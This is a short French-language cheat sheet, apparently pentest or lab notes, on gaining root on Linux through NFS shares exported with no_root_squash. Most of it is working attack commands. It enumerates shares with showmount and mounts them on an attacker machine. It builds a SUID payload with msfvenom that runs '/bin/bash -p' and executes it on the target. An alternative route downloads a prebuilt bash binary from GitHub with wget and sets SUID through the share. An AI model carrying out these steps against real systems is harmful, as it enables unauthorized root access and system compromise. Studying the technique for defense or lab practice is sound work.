Les vecteurs d’élévation de privilèges ne se limitent pas à l’accès interne.

**Les etapes d'exploitation:**
L'élément critique pour ce vecteur d'escalade de privilèges est l'option `no_root_squash`

- Enumerer les partages
- Sur votre box Kali, basculez vers votre utilisateur root
- Monter l'un des partages "no_root_squash" sur notre machine attaquante et commencer à construire l'exécutable
- Créer un exécutable avec le bit SUID (`chmod +s nfs`) défini et l'exécuter sur le système cible.

```sh
showmount -e <target>
```

```sh
cat /etc/exports
```

Afficher les dossier partager en reseau.

```sh
mount -o rw [TARGET_IP]:/[SHARE] /attacker/mount_folder
mount -o rw,vers=3 TARGET_IP:/tmp /attacker/mount_folder
sudo mount -t nfs [TARGET_IP]:/[SHARE] /attacker/mount_folder -nolock
```

Monter le partage `no_root_spuash`

```sh
cd /attacker/mount_folder
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
chmod +xs shell.elf
```

Generer un executable avec un SUID defini

```sh
/FULL_PATH/shell.elf
```

Sur la machine cible, executer le binaire

---
**Une autre approche**

```sh
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
```

- Accès NFS ->
- Gagnez un shell à faible privilège ->
- Téléchargez l'exécutable Bash sur le partage NFS ->
- Définir les autorisations SUID via NFS en raison d'un squash racine mal configuré ->
- Connectez-vous via SSH ->
- Exécuter l'exécutable SUID Bit Bash ->
- ACCÈS RACINE
